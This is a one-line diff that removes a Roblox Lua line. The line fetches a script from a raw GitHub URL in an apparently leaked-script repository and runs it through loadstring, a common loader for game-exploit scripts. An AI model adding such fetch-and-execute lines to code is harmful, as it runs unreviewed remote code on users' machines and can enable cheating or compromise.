@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/FREE-LEAK/PF/main/MAIN.lua'),true))()
